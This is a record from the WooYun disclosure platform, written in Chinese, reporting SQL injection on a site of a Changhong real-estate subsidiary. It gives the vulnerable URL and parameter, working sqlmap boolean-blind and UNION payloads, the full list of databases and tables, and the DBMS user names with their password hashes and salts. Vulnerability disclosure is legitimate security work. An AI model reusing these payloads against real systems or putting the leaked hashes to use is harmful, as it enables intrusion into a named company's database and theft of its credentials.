{"id": 35749, "wybug_id": "wooyun-2015-0103270", "wybug_title": "四川长虹电器股份有限公司的控股子公司SQL注入一枚", "wybug_corp": "changhong.com", "wybug_author": "s0s", "wybug_date": "2015-03-24 10:14", "wybug_open_date": "2015-03-29 10:16", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 四川长虹置业有限公司是四川长虹电器股份有限公司的控股子公司，存在SQL注入漏洞 详细说明：  四川长虹置业有限公司是四川长虹电器股份有限公司的控股子公司，成立于2005年12月16日，是长虹集团公司为实现“九大战略业务单元”的发展新战略而创立的，目前已经成为长虹集团三大主营业务之一。公司经营范围涉及房地产开发、投资、咨询及销售、物业管理等多项业务，拥有西南地区最具实力的房地产经营团队之一。http://www.chre.cn/qywh/qywh.asp?classid=004001%27开始报错Microsoft OLE DB Provider for ODBC Drivers 错误 '80040e21'ODBC 驱动程序不支持所需的属性。/qywh/qywh.asp，行 22于是用工具跑得到库Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=390 AND 6745=6745    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: id=-5292 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(98)+CHAR(107)+CHAR(107)+CHAR(113)+CHAR(111)+CHAR(72)+CHAR(116)+CHAR(67)+CHAR(99)+CHAR(79)+CHAR(77)+CHAR(122)+CHAR(100)+CHAR(67)+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(107)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000available databases [18]:[*] dvbbs_test2009-6-4[*] IMSData[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] UFDATA_001_2006[*] UFDATA_001_2007[*] UFDATA_001_2008[*] UFDATA_001_2009[*] UFDATA_002_2007[*] UFDATA_002_2008[*] UFDATA_002_2009[*] UFDATA_999_2005[*] UFSub[*] UFSystem[*] zhiye2009-6-4sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=390 AND 6745=6745    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: id=-5292 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(98)+CHAR(107)+CHAR(107)+CHAR(113)+CHAR(111)+CHAR(72)+CHAR(116)+CHAR(67)+CHAR(99)+CHAR(79)+CHAR(77)+CHAR(122)+CHAR(100)+CHAR(67)+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(107)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000Database: tempdb[2 tables]+--------------------------------------------+| sysconstraints                             || syssegments                                |+--------------------------------------------+Database: msdb[78 tables]+--------------------------------------------+| RTblClassDefs                              || RTblClassExtension                         || RTblDBMProps                               || RTblDBXProps                               || RTblDTMProps                               || RTblDTSProps                               || RTblDatabaseVersion                        || RTblEQMProps                               || RTblEnumerationDef                         || RTblEnumerationValueDef                    || RTblGENProps                               || RTblIfaceDefs                              || RTblIfaceHier                              || RTblIfaceMem                               || RTblMDSProps                               || RTblNamedObj                               || RTblOLPProps                               || RTblParameterDef                           || RTblPropDefs                               || RTblProps                                  || RTblRelColDefs                             || RTblRelshipDefs                            || RTblRelshipProps                           || RTblRelships                               || RTblSIMProps                               || RTblScriptDefs                             || RTblSites                                  || RTblSumInfo                                || RTblTFMProps                               || RTblTypeInfo                               || RTblTypeLibs                               || RTblUMLProps                               || RTblUMXProps                               || RTblVersionAdminInfo                       || RTblVersions                               || RTblWorkspaceItems                         || backupfile                                 || backupmediafamily                          || backupmediaset                             || backupset                                  || log_shipping_primaries                     || log_shipping_secondaries                   || logmarkhistory                             || mswebtasks                                 || restorefilegroup                           || restorefilegroup                           || restorehistory                             || sqlagent_info                              || sysalerts                                  || syscachedcredentials                       || syscategories                              || sysconstraints                             || sysdbmaintplan_databases                   || sysdbmaintplan_history                     || sysdbmaintplan_jobs                        || sysdbmaintplans                            || sysdownloadlist                            || sysdtscategories                           || sysdtspackagelog                           || sysdtspackages                             || sysdtssteplog                              || sysdtstasklog                              || sysjobhistory                              || sysjobs_view                               || sysjobs_view                               || sysjobschedules                            || sysjobservers                              || sysjobsteps                                || sysnotifications                           || sysoperators                               || syssegments                                || systargetservergroupmembers                || systargetservergroups                      || systargetservers_view                      || systargetservers_view                      || systaskids                                 || systasks_view                              || systasks_view                              |+--------------------------------------------+Database: pubs[14 tables]+--------------------------------------------+| authors                                    || discounts                                  || employee                                   || jobs                                       || pub_info                                   || publishers                                 || roysched                                   || sales                                      || stores                                     || sysconstraints                             || syssegments                                || titleauthor                                || titles                                     || titleview                                  |+--------------------------------------------+Database: zhiye2009-6-4[29 tables]+--------------------------------------------+| Ad                                         || Advice                                     || City                                       || Class                                      || Employee                                   || Flag                                       || MenuClass                                  || MenuClass                                  || Online                                     || OrderForm                                  || OrderList                                  || Product                                    || Sata                                       || ServeInfo                                  || StatList                                   || book                                       || brand                                      || brokerinfo                                 || dtproperties                               || ip                                         || lianjie                                    || newsclass                                  || newsclass                                  || ruanjian                                   || service                                    || sysconstraints                             || syssegments                                || upxls                                      || wsbm                                       |+--------------------------------------------+Database: master[39 tables]+--------------------------------------------+| INFORMATION_SCHEMA.CHECK_CONSTRAINTS       || INFORMATION_SCHEMA.COLUMNS                 || INFORMATION_SCHEMA.COLUMN_DOMAIN_USAGE     || INFORMATION_SCHEMA.COLUMN_PRIVILEGES       || INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE || INFORMATION_SCHEMA.CONSTRAINT_TABLE_USAGE  || INFORMATION_SCHEMA.DOMAINS                 || INFORMATION_SCHEMA.DOMAIN_CONSTRAINTS      || INFORMATION_SCHEMA.KEY_COLUMN_USAGE        || INFORMATION_SCHEMA.PARAMETERS              || INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS || INFORMATION_SCHEMA.ROUTINES                || INFORMATION_SCHEMA.ROUTINE_COLUMNS         || INFORMATION_SCHEMA.SCHEMATA                || INFORMATION_SCHEMA.TABLES                  || INFORMATION_SCHEMA.TABLE_CONSTRAINTS       || INFORMATION_SCHEMA.TABLE_PRIVILEGES        || INFORMATION_SCHEMA.VIEWS                   || INFORMATION_SCHEMA.VIEW_COLUMN_USAGE       || INFORMATION_SCHEMA.VIEW_TABLE_USAGE        || Dv_Vote                                    || Dv_VoteUser                                || MSreplication_options                      || dtproperties                               || spt_datatype_info_ext                      || spt_datatype_info_ext                      || spt_fallback_db                            || spt_fallback_dev                           || spt_fallback_usg                           || spt_monitor                                || spt_provider_types                         || spt_server_info                            || spt_values                                 || sysconstraints                             || syslogins                                  || sysoledbusers                              || sysopentapes                               || sysremotelogins                            || syssegments                                |+--------------------------------------------+Database: Northwind[31 tables]+--------------------------------------------+| Categories                                 || CustomerCustomerDemo                       || CustomerDemographics                       || Customers                                  || EmployeeTerritories                        || Employees                                  || Invoices                                   || Region                                     || Shippers                                   || Suppliers                                  || Territories                                || Alphabetical list of products              || Category Sales for 1997                    || Current Product List                       || Customer and Suppliers by City             || Order Details Extended                     || Order Details Extended                     || Order Subtotals                            || Orders Qry                                 || Orders Qry                                 || Product Sales for 1997                     || Products Above Average Price               || Products Above Average Price               || Products by Category                       || Quarterly Orders                           || Sales Totals by Amount                     || Sales by Category                          || Summary of Sales by Quarter                || Summary of Sales by Year                   || sysconstraints                             || syssegments                                |+--------------------------------------------+   漏洞证明：  database management system users [4]:[*] BUILTIN\\\\Administrators[*] gk[*] saa[*] zhiye-userdatabase management system users password hashes:[*] BUILTIN\\\\Administrators [1]:    password hash: NULL[*] gk [1]:    password hash: 0x0100ef393e15750667aae4e1f09f113d0a6eb35d37e098c8a3c3aa2079ff161d4c6035b3218b4433fa6cc7b7114d        header: 0x0100        salt: ef393e15        mixedcase: 750667aae4e1f09f113d0a6eb35d37e098c8a3c3        uppercase: aa2079ff161d4c6035b3218b4433fa6cc7b7114d[*] saa [1]:    password hash: 0x01000d382458bc66914bce3af077b2b7a18892dfbf0ec5d8fff4bc66914bce3af077b2b7a18892dfbf0ec5d8fff4        header: 0x0100        salt: 0d382458        mixedcase: bc66914bce3af077b2b7a18892dfbf0ec5d8fff4        uppercase: bc66914bce3af077b2b7a18892dfbf0ec5d8fff4[*] zhiye-user [1]:    password hash: 0x01001e1a83560ae40324060bae7da742c654d29c804a4759a576149a12465c94fe590750e92204d40a639cb59cc0        header: 0x0100        salt: 1e1a8356        mixedcase: 0ae40324060bae7da742c654d29c804a4759a576        uppercase: 149a12465c94fe590750e92204d40a639cb59cc0   修复方案：  过滤   版权声明：转载请注明来源 s0s@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-03-29 10:16 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}